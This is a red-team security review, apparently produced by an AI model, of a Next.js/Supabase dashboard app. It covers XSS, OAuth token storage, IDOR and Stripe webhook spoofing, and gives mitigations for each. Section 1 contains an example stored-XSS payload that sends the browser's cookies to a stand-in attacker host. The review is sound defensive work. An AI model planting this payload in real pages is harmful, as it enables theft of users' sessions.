# Security Review: Dashboard Hub

*As requested, here is a red-team analysis of the architecture and implementation plan.*

## 1. Threat Vector: Stored XSS via Google Sheets (The "Poisoned Cell" Attack)
**Risk Level: HIGH**
- **The Attack:** Because the user is encouraged to input their own data into the Google Sheet, an attacker (or even the user themselves pasting malicious data) could enter a payload into a cell (e.g., `<script>fetch('attacker.com/?cookie='+document.cookie)</script>`).
- **The Exploit:** When the Next.js app fetches the Sheet JSON and renders it via Tremor, if the React code uses `dangerouslySetInnerHTML` or doesn't properly sanitize the strings before rendering them into tables or markdown components, the XSS payload executes in the victim's browser context.
- **The Mitigation:** 
  - Strictly type all incoming JSON from Google Sheets.
  - Never use `dangerouslySetInnerHTML` when rendering Sheet data.
  - If rendering Markdown from Sheet cells, use a strict sanitizer like `rehype-sanitize` before rendering.

## 2. Threat Vector: OAuth Token Hijacking / Session Subversion
**Risk Level: HIGH**
- **The Attack:** We are storing the user's Google OAuth refresh/access tokens to read their sheets. Wait, *are we storing them in Supabase?*
- **The Exploit:** If we store the `google_refresh_token` in plain text in Supabase, and our DB is breached (or we misconfigure Row Level Security), the attacker can mint fresh access tokens and read *any* file the user authorized (even with just `drive.file` scope, they can read the user's personal tracker data).
- **The Mitigation:** 
  - **Do NOT** store tokens in Supabase plain text. 
  - Use NextAuth (Auth.js) to store the access/refresh tokens in an encrypted HTTP-only, secure cookie session *on the client*, OR if they must be stored in Postgres for background jobs, they **must** be symmetrically encrypted at rest using an AES key stored securely in Vercel Environment variables.

## 3. Threat Vector: IDOR (Insecure Direct Object Reference) on Dashboards
**Risk Level: MEDIUM**
- **The Attack:** User buys "Reading Tracker" (ID: 123). Attacker creates a free account, logs in, and changes the URL to `/dashboard/123`.
- **The Exploit:** If the Next.js API simply queries the Sheet using the currently logged-in user's token *without* checking the `purchases` table to see if `user_id` has `has_access = true` for `dashboard_id: 123`, the attacker gets the premium dashboard UI for free.
- **The Mitigation:** 
  - Every protected API route and page route MUST feature a middleware or server-side authorization check against `purchases.is_approved === true`. 
  - Enable strict Row Level Security (RLS) policies in Supabase so users can only `SELECT` from the `purchases` table where `auth.uid() = user_id`.

## 4. Threat Vector: Webhook Spoofing (Phase 2 Stripe Integration)
**Risk Level: MEDIUM**
- **The Attack:** Attacker discovers the `/api/webhooks/stripe` endpoint.
- **The Exploit:** They send a fake JSON payload mimicking a successful `checkout.session.completed` event, tricking our DB into granting them access to a $50 dashboard for free.
- **The Mitigation:** 
  - The webhook handler *must* use `stripe.webhooks.constructEvent` with the `STRIPE_WEBHOOK_SECRET` to cryptographically verify the payload actually came from Stripe.

---

### Summary of Required Action Items for the Implementation Plan:
1. Ensure tokens are encrypted at rest or strictly stored in secure cookies.
2. Implement strict sanitization on all Google Sheet string outputs.
3. Apply Supabase RLS policies on day one.
